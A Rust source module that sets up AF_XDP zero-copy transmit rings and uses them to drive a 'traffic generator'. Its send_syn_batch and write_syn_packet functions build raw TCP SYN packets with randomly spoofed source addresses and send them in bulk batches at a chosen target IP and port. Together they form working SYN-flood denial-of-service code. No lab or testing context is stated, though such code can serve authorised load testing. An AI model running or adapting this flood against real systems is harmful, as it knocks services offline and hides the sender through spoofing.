//! AF_XDP Zero-Copy Packet Transmission
//!
//! This module implements high-performance packet transmission using AF_XDP.
//! Instead of one syscall per packet, we write to shared memory rings and
//! batch-notify the kernel.
//!
//! Architecture:
//! ```text
//! USERSPACE                           KERNEL
//! ─────────────────────────────────────────────────────────
//!                   UMEM (shared mmap'd memory)
//!            ┌────────────────────────────────────┐
//!            │ frame0 │ frame1 │ frame2 │ frame3 │
//!            └────┬───┴────┬───┴────┬───┴────┬───┘
//!                 │        │        │        │
//!     TX Ring     ▼        ▼        ▼        ▼
//!     ┌─────────────────────────────────────────┐
//!     │ desc0 │ desc1 │ desc2 │ desc3 │  ...   │
//!     └───────────────────────────────────────┬─┘
//!       producer ────────────────────────────▶│ consumer
//!       (userspace)                           (kernel)
//!
//!     Completion Ring (kernel → userspace)
//!     ┌─────────────────────────────────────────┐
//!     │ addr0 │ addr1 │  ...  │                 │
//!     └─────────────────────────────────────────┘
//!       producer                        consumer
//!       (kernel)                        (userspace)
//! ```

use std::collections::VecDeque;
use std::net::Ipv4Addr;
use std::os::unix::io::RawFd;
use std::ptr;
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use anyhow::{anyhow, Result};
use tracing::{info, debug};

// XDP socket constants (from linux/if_xdp.h)
// These aren't in libc, so we define them here

// Bind flags
const XDP_SHARED_UMEM: u16 = 1 << 0;
const XDP_COPY: u16 = 1 << 1;
const XDP_ZEROCOPY: u16 = 1 << 2;
const XDP_USE_NEED_WAKEUP: u16 = 1 << 3;

// Socket options (for setsockopt/getsockopt)
const XDP_MMAP_OFFSETS: libc::c_int = 1;
const XDP_RX_RING: libc::c_int = 2;
const XDP_TX_RING: libc::c_int = 3;
const XDP_UMEM_REG: libc::c_int = 4;
const XDP_UMEM_FILL_RING: libc::c_int = 5;
const XDP_UMEM_COMPLETION_RING: libc::c_int = 6;

// Socket level for XDP
const SOL_XDP: libc::c_int = 283;

// Mmap offsets for ring buffers
// These are the offset values passed to mmap() as the last argument
const XDP_PGOFF_RX_RING: libc::off_t = 0;
const XDP_PGOFF_TX_RING: libc::off_t = 0x80000000;
const XDP_UMEM_PGOFF_FILL_RING: libc::off_t = 0x100000000;
const XDP_UMEM_PGOFF_COMPLETION_RING: libc::off_t = 0x180000000;

// Ring offsets structure
#[repr(C)]
#[derive(Debug, Default)]
struct XdpRingOffset {
    producer: u64,
    consumer: u64,
    desc: u64,
    flags: u64,
}

#[repr(C)]
#[derive(Debug, Default)]
struct XdpMmapOffsets {
    rx: XdpRingOffset,
    tx: XdpRingOffset,
    fr: XdpRingOffset,  // Fill ring
    cr: XdpRingOffset,  // Completion ring
}

// UMEM registration structure
#[repr(C)]
struct XdpUmemReg {
    addr: u64,
    len: u64,
    chunk_size: u32,
    headroom: u32,
    flags: u32,
}

// TX/RX descriptor
#[repr(C)]
#[derive(Debug, Clone, Copy, Default)]
struct XdpDesc {
    addr: u64,
    len: u32,
    options: u32,
}

/// Configuration for AF_XDP socket
pub struct AfXdpConfig {
    /// Interface name
    pub interface: String,
    /// Queue ID (usually 0)
    pub queue_id: u32,
    /// Number of frames in UMEM
    pub num_frames: u32,
    /// Size of each frame
    pub frame_size: u32,
    /// TX ring size (power of 2)
    pub tx_ring_size: u32,
    /// Completion ring size (power of 2)
    pub comp_ring_size: u32,
    /// Use zero-copy mode (requires driver support)
    pub zero_copy: bool,
    /// Use need_wakeup flag (reduces syscalls)
    pub need_wakeup: bool,
}

impl Default for AfXdpConfig {
    fn default() -> Self {
        Self {
            interface: "macv1".to_string(),
            queue_id: 0,
            num_frames: 4096,
            frame_size: 2048,
            tx_ring_size: 2048,
            comp_ring_size: 2048,
            zero_copy: false,  // Start with copy mode for compatibility
            need_wakeup: true,
        }
    }
}

/// TX Ring wrapper for producer/consumer operations
struct TxRing {
    producer: *mut AtomicU32,
    consumer: *mut AtomicU32,
    ring: *mut XdpDesc,
    mask: u32,
    size: u32,
    cached_cons: u32,
}

unsafe impl Send for TxRing {}
unsafe impl Sync for TxRing {}

impl TxRing {
    /// Get number of free slots in the ring
    fn free_slots(&mut self) -> u32 {
        // Update cached consumer
        self.cached_cons = unsafe { (*self.consumer).load(Ordering::Acquire) };
        let prod = unsafe { (*self.producer).load(Ordering::Relaxed) };
        self.size - (prod - self.cached_cons)
    }

    /// Reserve slots for transmission
    fn reserve(&self, count: u32) -> Option<u32> {
        let prod = unsafe { (*self.producer).load(Ordering::Relaxed) };
        let cons = unsafe { (*self.consumer).load(Ordering::Acquire) };
        
        if self.size - (prod - cons) < count {
            return None;
        }
        
        Some(prod)
    }

    /// Write a descriptor
    fn write_desc(&self, idx: u32, addr: u64, len: u32) {
        let slot = (idx & self.mask) as usize;
        unsafe {
            let desc = self.ring.add(slot);
            (*desc).addr = addr;
            (*desc).len = len;
            (*desc).options = 0;
        }
    }

    /// Submit descriptors (make them visible to kernel)
    fn submit(&self, count: u32) {
        unsafe {
            // Memory barrier before updating producer
            std::sync::atomic::fence(Ordering::Release);
            let prod = (*self.producer).load(Ordering::Relaxed);
            (*self.producer).store(prod + count, Ordering::Release);
        }
    }
}

/// Completion Ring for tracking completed transmissions
struct CompRing {
    producer: *mut AtomicU32,
    consumer: *mut AtomicU32,
    ring: *mut u64,
    mask: u32,
    cached_prod: u32,
}

unsafe impl Send for CompRing {}
unsafe impl Sync for CompRing {}

impl CompRing {
    /// Get number of completed frames
    fn completed(&mut self) -> u32 {
        self.cached_prod = unsafe { (*self.producer).load(Ordering::Acquire) };
        let cons = unsafe { (*self.consumer).load(Ordering::Relaxed) };
        self.cached_prod - cons
    }

    /// Read completed frame addresses
    fn read(&self, start: u32, count: u32) -> Vec<u64> {
        let mut addrs = Vec::with_capacity(count as usize);
        for i in 0..count {
            let idx = ((start + i) & self.mask) as usize;
            addrs.push(unsafe { *self.ring.add(idx) });
        }
        addrs
    }

    /// Release consumed completions
    fn release(&self, count: u32) {
        unsafe {
            let cons = (*self.consumer).load(Ordering::Relaxed);
            (*self.consumer).store(cons + count, Ordering::Release);
        }
    }
}

/// AF_XDP Socket for high-performance packet TX
pub struct AfXdpSocket {
    fd: RawFd,
    umem: *mut u8,
    umem_size: usize,
    frame_size: u32,
    num_frames: u32,
    tx_ring: TxRing,
    comp_ring: CompRing,
    free_frames: VecDeque<u64>,
    ifindex: u32,
    need_wakeup: bool,
    
    // Stats
    pub packets_sent: AtomicU64,
    pub bytes_sent: AtomicU64,
    pub kicks: AtomicU64,
}

impl AfXdpSocket {
    /// Create a new AF_XDP socket
    pub fn new(config: &AfXdpConfig) -> Result<Self> {
        info!("Creating AF_XDP socket on {} queue {}", config.interface, config.queue_id);
        
        // Get interface index
        let ifname = std::ffi::CString::new(config.interface.as_str())?;
        let ifindex = unsafe { libc::if_nametoindex(ifname.as_ptr()) };
        if ifindex == 0 {
            return Err(anyhow!("Interface {} not found", config.interface));
        }
        info!("Interface index: {}", ifindex);

        // Create XDP socket
        let fd = unsafe { libc::socket(libc::AF_XDP, libc::SOCK_RAW, 0) };
        if fd < 0 {
            return Err(anyhow!("Failed to create XDP socket: {}. Need root/CAP_NET_RAW", 
                std::io::Error::last_os_error()));
        }
        debug!("Created XDP socket fd={}", fd);

        // Calculate UMEM size
        let umem_size = (config.num_frames * config.frame_size) as usize;
        
        // Allocate UMEM with mmap (page-aligned)
        let umem = unsafe {
            libc::mmap(
                ptr::null_mut(),
                umem_size,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS | libc::MAP_HUGETLB,
                -1,
                0,
            )
        };
        
        // Fall back to regular pages if hugepages unavailable
        let umem = if umem == libc::MAP_FAILED {
            debug!("Hugepages unavailable, using regular pages");
            unsafe {
                libc::mmap(
                    ptr::null_mut(),
                    umem_size,
                    libc::PROT_READ | libc::PROT_WRITE,
                    libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                    -1,
                    0,
                )
            }
        } else {
            umem
        };
        
        if umem == libc::MAP_FAILED {
            unsafe { libc::close(fd); }
            return Err(anyhow!("Failed to mmap UMEM: {}", std::io::Error::last_os_error()));
        }
        info!("Allocated UMEM: {} frames × {} bytes = {} MB", 
              config.num_frames, config.frame_size, umem_size / 1024 / 1024);

        // Register UMEM with the socket
        let umem_reg = XdpUmemReg {
            addr: umem as u64,
            len: umem_size as u64,
            chunk_size: config.frame_size,
            headroom: 0,
            flags: 0,
        };
        
        let ret = unsafe {
            libc::setsockopt(
                fd,
                SOL_XDP,
                XDP_UMEM_REG,
                &umem_reg as *const _ as *const libc::c_void,
                std::mem::size_of::<XdpUmemReg>() as u32,
            )
        };
        if ret < 0 {
            unsafe { 
                libc::munmap(umem, umem_size);
                libc::close(fd); 
            }
            return Err(anyhow!("Failed to register UMEM: {}", std::io::Error::last_os_error()));
        }
        debug!("Registered UMEM");

        // Set up TX ring
        let tx_ring_size = config.tx_ring_size;
        let ret = unsafe {
            libc::setsockopt(
                fd,
                SOL_XDP,
                XDP_TX_RING,
                &tx_ring_size as *const _ as *const libc::c_void,
                std::mem::size_of::<u32>() as u32,
            )
        };
        if ret < 0 {
            unsafe { 
                libc::munmap(umem, umem_size);
                libc::close(fd); 
            }
            return Err(anyhow!("Failed to set TX ring size: {}", std::io::Error::last_os_error()));
        }

        // Set up completion ring
        let comp_ring_size = config.comp_ring_size;
        let ret = unsafe {
            libc::setsockopt(
                fd,
                SOL_XDP,
                XDP_UMEM_COMPLETION_RING,
                &comp_ring_size as *const _ as *const libc::c_void,
                std::mem::size_of::<u32>() as u32,
            )
        };
        if ret < 0 {
            unsafe { 
                libc::munmap(umem, umem_size);
                libc::close(fd); 
            }
            return Err(anyhow!("Failed to set completion ring size: {}", std::io::Error::last_os_error()));
        }

        // Get mmap offsets
        let mut offsets = XdpMmapOffsets::default();
        let mut optlen = std::mem::size_of::<XdpMmapOffsets>() as u32;
        let ret = unsafe {
            libc::getsockopt(
                fd,
                SOL_XDP,
                XDP_MMAP_OFFSETS,
                &mut offsets as *mut _ as *mut libc::c_void,
                &mut optlen,
            )
        };
        if ret < 0 {
            unsafe { 
                libc::munmap(umem, umem_size);
                libc::close(fd); 
            }
            return Err(anyhow!("Failed to get mmap offsets: {}", std::io::Error::last_os_error()));
        }
        debug!("TX ring offsets: prod={}, cons={}, desc={}", 
               offsets.tx.producer, offsets.tx.consumer, offsets.tx.desc);

        // Calculate ring sizes
        let tx_ring_mmap_size = offsets.tx.desc as usize 
            + (tx_ring_size as usize * std::mem::size_of::<XdpDesc>());
        let comp_ring_mmap_size = offsets.cr.desc as usize 
            + (comp_ring_size as usize * std::mem::size_of::<u64>());

        // Mmap TX ring
        // Use our defined constant for the mmap offset
        let tx_mmap = unsafe {
            libc::mmap(
                ptr::null_mut(),
                tx_ring_mmap_size,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_SHARED | libc::MAP_POPULATE,
                fd,
                XDP_PGOFF_TX_RING,
            )
        };
        if tx_mmap == libc::MAP_FAILED {
            unsafe { 
                libc::munmap(umem, umem_size);
                libc::close(fd); 
            }
            return Err(anyhow!("Failed to mmap TX ring: {}", std::io::Error::last_os_error()));
        }

        // Mmap completion ring
        let comp_mmap = unsafe {
            libc::mmap(
                ptr::null_mut(),
                comp_ring_mmap_size,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_SHARED | libc::MAP_POPULATE,
                fd,
                XDP_UMEM_PGOFF_COMPLETION_RING,
            )
        };
        if comp_mmap == libc::MAP_FAILED {
            unsafe { 
                libc::munmap(umem, umem_size);
                libc::munmap(tx_mmap, tx_ring_mmap_size);
                libc::close(fd); 
            }
            return Err(anyhow!("Failed to mmap completion ring: {}", std::io::Error::last_os_error()));
        }

        // Build ring structures
        let tx_ring = TxRing {
            producer: unsafe { tx_mmap.add(offsets.tx.producer as usize) as *mut AtomicU32 },
            consumer: unsafe { tx_mmap.add(offsets.tx.consumer as usize) as *mut AtomicU32 },
            ring: unsafe { tx_mmap.add(offsets.tx.desc as usize) as *mut XdpDesc },
            mask: tx_ring_size - 1,
            size: tx_ring_size,
            cached_cons: 0,
        };

        let comp_ring = CompRing {
            producer: unsafe { comp_mmap.add(offsets.cr.producer as usize) as *mut AtomicU32 },
            consumer: unsafe { comp_mmap.add(offsets.cr.consumer as usize) as *mut AtomicU32 },
            ring: unsafe { comp_mmap.add(offsets.cr.desc as usize) as *mut u64 },
            mask: comp_ring_size - 1,
            cached_prod: 0,
        };

        // Initialize free frame list
        let mut free_frames = VecDeque::with_capacity(config.num_frames as usize);
        for i in 0..config.num_frames {
            free_frames.push_back((i * config.frame_size) as u64);
        }
        info!("Initialized {} free frames", free_frames.len());

        // Bind to interface
        #[repr(C)]
        struct SockaddrXdp {
            sxdp_family: u16,
            sxdp_flags: u16,
            sxdp_ifindex: u32,
            sxdp_queue_id: u32,
            sxdp_shared_umem_fd: u32,
        }

        let mut bind_flags = 0u16;
        if config.zero_copy {
            bind_flags |= XDP_ZEROCOPY;
        } else {
            bind_flags |= XDP_COPY;
        }
        if config.need_wakeup {
            bind_flags |= XDP_USE_NEED_WAKEUP;
        }

        let sxdp = SockaddrXdp {
            sxdp_family: libc::AF_XDP as u16,
            sxdp_flags: bind_flags,
            sxdp_ifindex: ifindex,
            sxdp_queue_id: config.queue_id,
            sxdp_shared_umem_fd: 0,
        };

        let ret = unsafe {
            libc::bind(
                fd,
                &sxdp as *const _ as *const libc::sockaddr,
                std::mem::size_of::<SockaddrXdp>() as u32,
            )
        };
        if ret < 0 {
            let err = std::io::Error::last_os_error();
            unsafe { 
                libc::munmap(umem, umem_size);
                libc::munmap(tx_mmap, tx_ring_mmap_size);
                libc::munmap(comp_mmap, comp_ring_mmap_size);
                libc::close(fd); 
            }
            return Err(anyhow!("Failed to bind XDP socket: {}. \
                Note: AF_XDP requires an XDP program attached to the interface, \
                or XDP_SKB_MODE flag. Try: ip link set dev {} xdp off", 
                err, config.interface));
        }
        info!("Bound to {}:{} with flags 0x{:x}", config.interface, config.queue_id, bind_flags);

        Ok(Self {
            fd,
            umem: umem as *mut u8,
            umem_size,
            frame_size: config.frame_size,
            num_frames: config.num_frames,
            tx_ring,
            comp_ring,
            free_frames,
            ifindex,
            need_wakeup: config.need_wakeup,
            packets_sent: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            kicks: AtomicU64::new(0),
        })
    }

    /// Get a frame buffer for writing a packet
    pub fn get_frame(&mut self) -> Option<(u64, &mut [u8])> {
        // First, reclaim completed frames
        self.reclaim_completed();

        // Get a free frame
        let addr = self.free_frames.pop_front()?;
        let slice = unsafe {
            std::slice::from_raw_parts_mut(
                self.umem.add(addr as usize),
                self.frame_size as usize,
            )
        };
        Some((addr, slice))
    }

    /// Submit a frame for transmission
    /// 
    /// This doesn't syscall - it just updates the ring. Call `kick()` or
    /// `kick_if_needed()` to actually trigger transmission.
    pub fn submit_frame(&mut self, addr: u64, len: u32) -> bool {
        // Check if there's space in TX ring
        if self.tx_ring.free_slots() == 0 {
            return false;
        }

        // Reserve a slot
        let Some(prod) = self.tx_ring.reserve(1) else {
            return false;
        };

        // Write descriptor
        self.tx_ring.write_desc(prod, addr, len);
        
        // Submit
        self.tx_ring.submit(1);
        
        self.packets_sent.fetch_add(1, Ordering::Relaxed);
        self.bytes_sent.fetch_add(len as u64, Ordering::Relaxed);
        
        true
    }

    /// Submit multiple frames at once (batch submission)
    pub fn submit_frames(&mut self, frames: &[(u64, u32)]) -> usize {
        let count = frames.len() as u32;
        if count == 0 {
            return 0;
        }

        // Check available space
        let available = self.tx_ring.free_slots();
        let to_submit = count.min(available);

        if to_submit == 0 {
            return 0;
        }

        // Reserve slots
        let Some(prod) = self.tx_ring.reserve(to_submit) else {
            return 0;
        };

        // Write descriptors
        for (i, (addr, len)) in frames.iter().take(to_submit as usize).enumerate() {
            self.tx_ring.write_desc(prod + i as u32, *addr, *len);
            self.packets_sent.fetch_add(1, Ordering::Relaxed);
            self.bytes_sent.fetch_add(*len as u64, Ordering::Relaxed);
        }

        // Submit all at once
        self.tx_ring.submit(to_submit);

        to_submit as usize
    }

    /// Kick the kernel to process TX ring
    /// 
    /// With NEED_WAKEUP, this is only needed when the kernel is sleeping.
    pub fn kick(&self) -> Result<()> {
        let ret = unsafe {
            libc::sendto(
                self.fd,
                ptr::null(),
                0,
                libc::MSG_DONTWAIT,
                ptr::null(),
                0,
            )
        };
        
        if ret < 0 {
            let err = std::io::Error::last_os_error();
            if err.raw_os_error() != Some(libc::EAGAIN) 
                && err.raw_os_error() != Some(libc::EBUSY) {
                return Err(anyhow!("sendto failed: {}", err));
            }
        }
        
        self.kicks.fetch_add(1, Ordering::Relaxed);
        Ok(())
    }

    /// Kick only if the kernel needs it (checks NEED_WAKEUP flag)
    pub fn kick_if_needed(&self) -> Result<()> {
        // For now, always kick. A proper implementation would check
        // the XDP_RING_NEED_WAKEUP flag in the ring's flags field.
        self.kick()
    }

    /// Reclaim completed frames back to the free list
    fn reclaim_completed(&mut self) {
        let completed = self.comp_ring.completed();
        if completed == 0 {
            return;
        }

        let cons = unsafe { (*self.comp_ring.consumer).load(Ordering::Relaxed) };
        let addrs = self.comp_ring.read(cons, completed);
        
        for addr in addrs {
            self.free_frames.push_back(addr);
        }
        
        self.comp_ring.release(completed);
        debug!("Reclaimed {} frames, {} now free", completed, self.free_frames.len());
    }

    /// Get number of free frames available
    pub fn free_frame_count(&self) -> usize {
        self.free_frames.len()
    }

    /// Get stats
    pub fn stats(&self) -> (u64, u64, u64) {
        (
            self.packets_sent.load(Ordering::Relaxed),
            self.bytes_sent.load(Ordering::Relaxed),
            self.kicks.load(Ordering::Relaxed),
        )
    }
}

impl Drop for AfXdpSocket {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.fd);
            libc::munmap(self.umem as *mut libc::c_void, self.umem_size);
            // Note: TX and completion ring mmaps should also be unmapped
            // but we'd need to store their sizes
        }
    }
}

/// High-level traffic generator using AF_XDP
pub struct AfXdpGenerator {
    socket: AfXdpSocket,
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
}

impl AfXdpGenerator {
    pub fn new(config: &AfXdpConfig, dst_mac: [u8; 6]) -> Result<Self> {
        let socket = AfXdpSocket::new(config)?;
        
        // Get source MAC
        let src_mac = get_mac(&config.interface)?;
        info!("Source MAC: {:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
              src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
        
        Ok(Self {
            socket,
            src_mac,
            dst_mac,
        })
    }

    /// Send a batch of SYN packets
    /// 
    /// This is the hot path - it writes packets directly to UMEM and
    /// submits to the TX ring with no syscall per packet.
    pub fn send_syn_batch(
        &mut self,
        target_ip: Ipv4Addr,
        target_port: u16,
        source_network: u8,
        count: usize,
    ) -> usize {
        use rand::{Rng, SeedableRng};
        let mut rng = rand::rngs::StdRng::from_entropy();
        
        let mut submitted = 0;
        let mut batch = Vec::with_capacity(count.min(64));

        for _ in 0..count {
            // Get a frame from UMEM
            let Some((addr, frame)) = self.socket.get_frame() else {
                break;
            };

            // Generate spoofed source IP
            let src_ip = Ipv4Addr::new(
                source_network,
                rng.gen(),
                rng.gen(),
                rng.gen::<u8>().max(1),
            );

            // Write packet directly to UMEM (zero-copy!)
            let len = write_syn_packet(
                frame,
                &self.src_mac,
                &self.dst_mac,
                src_ip,
                target_ip,
                rng.gen_range(1024..65535),
                target_port,
                &mut rng,
            );

            batch.push((addr, len as u32));

            // Submit in batches of 64
            if batch.len() >= 64 {
                submitted += self.socket.submit_frames(&batch);
                batch.clear();
            }
        }

        // Submit remaining
        if !batch.is_empty() {
            submitted += self.socket.submit_frames(&batch);
        }

        submitted
    }

    /// Kick the kernel to transmit (call periodically)
    pub fn kick(&self) -> Result<()> {
        self.socket.kick()
    }

    /// Get stats
    pub fn stats(&self) -> (u64, u64, u64) {
        self.socket.stats()
    }

    /// Get free frame count
    pub fn free_frames(&self) -> usize {
        self.socket.free_frame_count()
    }
}

/// Get MAC address from interface
fn get_mac(name: &str) -> Result<[u8; 6]> {
    let path = format!("/sys/class/net/{}/address", name);
    let mac_str = std::fs::read_to_string(&path)
        .map_err(|e| anyhow!("Failed to read MAC from {}: {}", path, e))?;
    
    let parts: Vec<u8> = mac_str
        .trim()
        .split(':')
        .filter_map(|s| u8::from_str_radix(s, 16).ok())
        .collect();
    
    if parts.len() != 6 {
        return Err(anyhow!("Invalid MAC format: {}", mac_str));
    }
    
    Ok([parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]])
}

/// Write a SYN packet directly to a buffer
/// Returns the packet length
fn write_syn_packet<R: rand::Rng>(
    buf: &mut [u8],
    src_mac: &[u8; 6],
    dst_mac: &[u8; 6],
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    rng: &mut R,
) -> usize {
    const PACKET_LEN: usize = 14 + 20 + 20; // Eth + IP + TCP
    
    // Ethernet header (14 bytes)
    buf[0..6].copy_from_slice(dst_mac);
    buf[6..12].copy_from_slice(src_mac);
    buf[12..14].copy_from_slice(&0x0800u16.to_be_bytes());
    
    // IP header (20 bytes)
    let ip = &mut buf[14..34];
    ip[0] = 0x45;  // Version + IHL
    ip[1] = 0x00;  // DSCP + ECN
    ip[2..4].copy_from_slice(&40u16.to_be_bytes()); // Total length
    ip[4..6].copy_from_slice(&rng.gen::<u16>().to_be_bytes()); // ID
    ip[6] = 0x40;  // Flags: DF
    ip[7] = 0x00;  // Fragment offset
    ip[8] = 64;    // TTL
    ip[9] = 6;     // Protocol: TCP
    ip[10..12].copy_from_slice(&[0, 0]); // Checksum placeholder
    ip[12..16].copy_from_slice(&src_ip.octets());
    ip[16..20].copy_from_slice(&dst_ip.octets());
    
    // IP checksum
    let ip_csum = checksum(&buf[14..34]);
    buf[24..26].copy_from_slice(&ip_csum.to_be_bytes());
    
    // TCP header (20 bytes)
    let tcp = &mut buf[34..54];
    tcp[0..2].copy_from_slice(&src_port.to_be_bytes());
    tcp[2..4].copy_from_slice(&dst_port.to_be_bytes());
    tcp[4..8].copy_from_slice(&rng.gen::<u32>().to_be_bytes()); // Seq
    tcp[8..12].copy_from_slice(&0u32.to_be_bytes()); // Ack
    tcp[12] = 0x50; // Data offset
    tcp[13] = 0x02; // Flags: SYN
    tcp[14..16].copy_from_slice(&65535u16.to_be_bytes()); // Window
    tcp[16..18].copy_from_slice(&[0, 0]); // Checksum placeholder
    tcp[18..20].copy_from_slice(&[0, 0]); // Urgent pointer
    
    // TCP checksum (with pseudo-header)
    let tcp_csum = tcp_checksum(&src_ip, &dst_ip, &buf[34..54]);
    buf[50..52].copy_from_slice(&tcp_csum.to_be_bytes());
    
    PACKET_LEN
}

fn checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    
    while i + 1 < data.len() {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }
    
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }
    
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    !(sum as u16)
}

fn tcp_checksum(src_ip: &Ipv4Addr, dst_ip: &Ipv4Addr, tcp_segment: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    
    // Pseudo-header
    let src = src_ip.octets();
    let dst = dst_ip.octets();
    sum += u16::from_be_bytes([src[0], src[1]]) as u32;
    sum += u16::from_be_bytes([src[2], src[3]]) as u32;
    sum += u16::from_be_bytes([dst[0], dst[1]]) as u32;
    sum += u16::from_be_bytes([dst[2], dst[3]]) as u32;
    sum += 6u32; // TCP
    sum += tcp_segment.len() as u32;
    
    // TCP segment
    let mut i = 0;
    while i + 1 < tcp_segment.len() {
        if i == 16 { i += 2; continue; } // Skip checksum field
        sum += u16::from_be_bytes([tcp_segment[i], tcp_segment[i + 1]]) as u32;
        i += 2;
    }
    
    if i < tcp_segment.len() {
        sum += (tcp_segment[i] as u32) << 8;
    }
    
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    !(sum as u16)
}
